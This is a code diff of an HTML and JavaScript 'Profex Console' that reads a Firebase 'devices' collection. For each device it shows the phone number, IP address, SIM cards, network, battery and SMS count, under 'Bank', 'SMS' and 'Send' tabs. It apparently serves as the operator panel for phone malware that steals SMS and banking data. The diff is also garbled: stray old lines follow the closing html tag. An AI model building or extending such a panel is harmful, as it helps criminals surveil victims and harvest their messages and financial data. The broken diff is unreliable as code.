@@ -8,17 +8,16 @@
 </head>
 <body class="bg-gray-900 text-white font-sans antialiased flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div class="w-full max-w-md bg-gray-800 rounded-xl shadow-2xl overflow-hidden border border-gray-700 pb-4 relative min-h-[500px]">
+    <!-- Main Container -->
+    <div class="w-full max-w-md bg-gray-800 rounded-xl shadow-2xl overflow-hidden border border-gray-700 relative min-h-[500px]">
         
-        <!-- Header -->
-        <div class="bg-gray-950 p-5 text-center border-b border-gray-700 shadow-sm relative">
-            <button id="btn-back" class="hidden absolute left-4 top-5 bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-sm text-gray-300 font-bold transition">← Back</button>
+        <!-- Header for Connect & List Pages -->
+        <div id="main-header" class="bg-gray-950 p-5 text-center border-b border-gray-700 shadow-sm relative">
             <h1 class="text-2xl font-bold tracking-widest text-blue-500 uppercase drop-shadow-md">Profex Console</h1>
             <p id="header-status" class="text-gray-400 text-xs mt-1">Status: Disconnected</p>
         </div>
 
         <div class="p-5">
-            
             <!-- SCREEN 1: CONNECTION PAGE -->
             <div id="screen-connect" class="space-y-4">
                 <div class="bg-gray-900 p-4 rounded-lg border border-gray-700">
@@ -30,11 +29,236 @@
                 </div>
             </div>
 
-            <!-- SCREEN 2: DEVICE (NUMBERS) LIST PAGE -->
+            <!-- SCREEN 2: DEVICE LIST PAGE -->
             <div id="screen-list" class="hidden space-y-3">
                 <div class="flex justify-between items-center border-b border-gray-700 pb-2 mb-2">
                     <h2 class="text-lg font-semibold text-gray-200">Active Devices</h2>
                     <span id="account-count" class="bg-green-600 text-white text-xs px-2 py-0.5 rounded-full shadow">0</span>
+                </div>
+                <div id="device-list-container" class="flex flex-col gap-2 max-h-[350px] overflow-y-auto pr-1">
+                    <div class="text-center text-gray-500 text-sm py-4">Waiting for devices...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: ADVANCED DEVICE DETAILS PAGE (Dark UI) -->
+        <div id="screen-details" class="hidden absolute top-0 left-0 w-full h-full bg-[#0a0a0a] z-50 flex flex-col overflow-hidden">
+            
+            <!-- Top Header -->
+            <div class="flex items-center justify-between p-4 border-b border-gray-800">
+                <div class="flex items-center gap-3">
+                    <div class="w-9 h-9 rounded-full bg-gray-900 border border-gray-700 flex items-center justify-center">
+                        <svg class="w-5 h-5 text-teal-500" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zM6 10a4 4 0 118 0 4 4 0 01-8 0z"/></svg>
+                    </div>
+                    <div>
+                        <h2 id="detail-id" class="text-gray-100 font-bold text-sm">Loading...</h2>
+                        <p id="detail-sub" class="text-gray-500 text-xs truncate w-32">...</p>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <button class="w-8 h-8 rounded-full bg-red-950/40 text-red-500 flex items-center justify-center hover:bg-red-900/60 transition">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
+                    </button>
+                    <!-- Close Button -->
+                    <button id="btn-close-details" class="w-8 h-8 rounded-full bg-gray-800 text-gray-400 flex items-center justify-center hover:bg-gray-700 transition">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Status Bar -->
+            <div class="flex items-center gap-4 px-5 py-3 text-xs bg-[#0a0a0a]">
+                <div class="flex items-center gap-1.5">
+                    <div class="w-2 h-2 rounded-full bg-teal-500"></div>
+                    <span class="text-teal-500 font-medium">Online</span>
+                </div>
+                <div class="text-gray-500">
+                    Bat <span class="text-yellow-500 font-medium ml-1" id="val-battery">--%</span>
+                </div>
+            </div>
+
+            <!-- Navigation Tabs -->
+            <div class="flex px-5 border-b border-gray-800 text-xs font-medium bg-[#0a0a0a]">
+                <div class="text-red-500 border-b-2 border-red-500 pb-2 pr-4 cursor-pointer">Info</div>
+                <div class="text-gray-500 pb-2 px-4 cursor-pointer hover:text-gray-300">Bank (0)</div>
+                <div class="text-gray-500 pb-2 px-4 cursor-pointer hover:text-gray-300">SMS (<span id="sms-count">0</span>)</div>
+                <div class="text-gray-500 pb-2 pl-4 cursor-pointer hover:text-gray-300">Send</div>
+            </div>
+
+            <!-- Content Area (Key-Value List) -->
+            <div class="flex-1 overflow-y-auto p-5 bg-[#0f0f0f]">
+                <!-- DEVICE SECTION -->
+                <div class="text-gray-500 text-[10px] font-bold tracking-wider mb-4">DEVICE</div>
+                <div class="space-y-4 text-xs mb-8" id="info-device-list">
+                    <!-- JS injects rows here -->
+                </div>
+
+                <!-- FROM SMS SECTION -->
+                <div class="text-gray-500 text-[10px] font-bold tracking-wider mb-4">FROM SMS</div>
+                <div class="space-y-4 text-xs" id="info-sms-list">
+                    <!-- JS injects rows here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+        const screenConnect = document.getElementById('screen-connect');
+        const screenList = document.getElementById('screen-list');
+        const screenDetails = document.getElementById('screen-details');
+        const headerStatus = document.getElementById('header-status');
+        const mainHeader = document.getElementById('main-header');
+        
+        let globalDb = null;
+        let activeDeviceListener = null;
+
+        // Screen Navigation Logic
+        function showScreen(screenName) {
+            screenConnect.classList.add('hidden');
+            screenList.classList.add('hidden');
+            screenDetails.classList.add('hidden');
+            mainHeader.classList.remove('hidden');
+
+            if(screenName === 'connect') screenConnect.classList.remove('hidden');
+            if(screenName === 'list') {
+                screenList.classList.remove('hidden');
+                headerStatus.innerText = "Status: Connected (Live)";
+                headerStatus.className = "text-green-400 text-xs mt-1 font-bold";
+            }
+            if(screenName === 'details') {
+                screenDetails.classList.remove('hidden');
+                mainHeader.classList.add('hidden'); // Detail page full screen cover karta hai
+            }
+        }
+
+        // Connect Database
+        document.getElementById('connect-db-btn').addEventListener('click', () => {
+            const configInput = document.getElementById('firebase-config-input').value.trim();
+            if(!configInput) return alert("Please enter Firebase details.");
+            
+            let dynamicConfig;
+            try {
+                if (configInput.startsWith("http")) {
+                    dynamicConfig = { databaseURL: configInput };
+                } else {
+                    dynamicConfig = JSON.parse(configInput);
+                }
+                
+                const dynamicApp = initializeApp(dynamicConfig, "App_" + Date.now());
+                globalDb = getDatabase(dynamicApp);
+
+                startListeningToDevices();
+                showScreen('list');
+
+            } catch (error) {
+                alert("Invalid Configuration. Ensure it's a correct JSON or valid URL.");
+            }
+        });
+
+        // Fetch Devices List
+        function startListeningToDevices() {
+            const listContainer = document.getElementById('device-list-container');
+            const dataRef = ref(globalDb, 'devices'); // Aapka database folder
+
+            onValue(dataRef, (snapshot) => {
+                const data = snapshot.val();
+                listContainer.innerHTML = ''; 
+                
+                if (data) {
+                    const keys = Object.keys(data);
+                    document.getElementById('account-count').innerText = keys.length;
+                    
+                    keys.forEach(deviceId => {
+                        const btn = document.createElement('button');
+                        btn.className = "w-full text-left bg-gray-800 hover:bg-gray-700 p-3 rounded-lg border border-l-4 border-l-green-500 border-gray-600 transition flex justify-between items-center";
+                        btn.innerHTML = `
+                            <span class="font-bold text-gray-200">${deviceId}</span>
+                            <span class="text-xs bg-gray-900 px-2 py-1 rounded text-blue-400">View Data →</span>
+                        `;
+                        btn.onclick = () => openDeviceDetails(deviceId);
+                        listContainer.appendChild(btn);
+                    });
+                } else {
+                    document.getElementById('account-count').innerText = "0";
+                    listContainer.innerHTML = '<div class="text-center text-gray-500 text-sm py-4">No active devices found.</div>';
+                }
+            });
+        }
+
+        // Close Detail Page (Back Button)
+        document.getElementById('btn-close-details').addEventListener('click', () => {
+            if(activeDeviceListener && globalDb) {
+                const targetId = document.getElementById('detail-id').innerText;
+                off(ref(globalDb, `devices/${targetId}`)); // Listener band karein taaki background me data load na ho
+            }
+            showScreen('list');
+        });
+
+        // Helper to format UI Rows
+        function createRow(label, value, valueColorClass = "text-gray-200") {
+            return `
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-500 font-medium">${label}</span>
+                    <span class="${valueColorClass} text-right font-mono">${value || '—'}</span>
+                </div>
+            `;
+        }
+
+        // Open Detail Page & Map Data
+        function openDeviceDetails(deviceId) {
+            showScreen('details');
+            
+            document.getElementById('detail-id').innerText = deviceId;
+            document.getElementById('detail-sub').innerText = deviceId;
+            
+            const deviceListEl = document.getElementById('info-device-list');
+            const smsListEl = document.getElementById('info-sms-list');
+            
+            deviceListEl.innerHTML = '<div class="text-gray-500 text-center animate-pulse py-4">Loading...</div>';
+            smsListEl.innerHTML = '';
+            document.getElementById('sms-count').innerText = "0";
+
+            const deviceRef = ref(globalDb, `devices/${deviceId}`);
+
+            activeDeviceListener = onValue(deviceRef, (snapshot) => {
+                const data = snapshot.val();
+                
+                if(data) {
+                    document.getElementById('val-battery').innerText = data.battery ? `${data.battery}%` : '36%';
+
+                    deviceListEl.innerHTML = 
+                        createRow("Phone Number", data.phoneNumber || data.number || data.phone) +
+                        createRow("Network", data.network, "text-gray-300") +
+                        createRow("Android", data.androidVersion || data.android) +
+                        createRow("IP Address", data.ip) +
+                        createRow("Storage", data.storage) +
+                        createRow("CPU Arch", data.cpu) +
+                        createRow("SDK Version", data.sdk) +
+                        createRow("SIM Cards", data.simCount ? `${data.simCount} SIM(s)` : "0 SIM(s)");
+
+                    smsListEl.innerHTML = 
+                        createRow("Phone #1", data.phone1 || data.phoneNumber, "text-blue-400") +
+                        createRow("Network #1", data.network1 || data.network, "text-fuchsia-400") +
+                        createRow("Network #2", data.network2, "text-fuchsia-400");
+                        
+                    if(data.smsCount) {
+                         document.getElementById('sms-count').innerText = data.smsCount;
+                    } else if(data.smsData && Array.isArray(data.smsData)) {
+                         document.getElementById('sms-count').innerText = data.smsData.length;
+                    }
+                } else {
+                    deviceListEl.innerHTML = '<div class="text-red-500 py-4">Device data unavailable or deleted.</div>';
+                    smsListEl.innerHTML = '';
+                }
+            });
+        }
+    </script>
+</body>
+</html>                    <span id="account-count" class="bg-green-600 text-white text-xs px-2 py-0.5 rounded-full shadow">0</span>
                 </div>
                 <!-- Dynamic Numbers will appear here -->
                 <div id="device-list-container" class="flex flex-col gap-2 max-h-[350px] overflow-y-auto pr-1">
